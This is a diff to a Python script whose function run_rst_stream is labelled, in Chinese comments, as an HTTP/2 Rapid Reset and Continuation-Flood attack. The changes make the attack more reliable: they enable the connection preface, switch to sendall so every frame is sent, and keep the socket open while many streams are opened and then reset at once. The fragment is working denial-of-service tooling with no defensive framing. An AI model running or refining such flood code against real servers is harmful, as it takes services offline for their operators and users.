@@ -345,7 +345,7 @@ def run_rst_stream(): # HTTP/2 Rapid Reset mix Continuation-Flood (不一定有�
 
                     # data = s.recv(65535)
                     # conn.receive_data(data) # 很多人說需要回傳 但是我自己測試 是不用的
-                    # s.sendall(conn.data_to_send())
+                    s.sendall(conn.data_to_send()) # 開啟http2連線
                     
                     try:
                         sid_lst = [] # 儲存sid用
@@ -365,7 +365,7 @@ def run_rst_stream(): # HTTP/2 Rapid Reset mix Continuation-Flood (不一定有�
 
                             # conn.send_data(sid, b"x" * 1024, end_stream=False)  # 模擬 body (沒啥用 註解掉了
 
-                            s.send(conn.data_to_send())
+                            s.sendall(conn.data_to_send()) # 改用sendall送完所有資料
 
                         # try:
                         #     data = s.recv(65535) # 同步frame (一樣沒啥用
@@ -375,9 +375,8 @@ def run_rst_stream(): # HTTP/2 Rapid Reset mix Continuation-Flood (不一定有�
 
                         for sid in sid_lst: # 這裡從sid_lst一次性把所有sid 做reset
                             conn.reset_stream(sid)
-                            s.send(conn.data_to_send())
+                            s.sendall(conn.data_to_send()) # 改用sendall送完所有資料
                         # print("suc rst")
-                        s.close()
                     except:
                         s.close()
                         # print("stream failed")
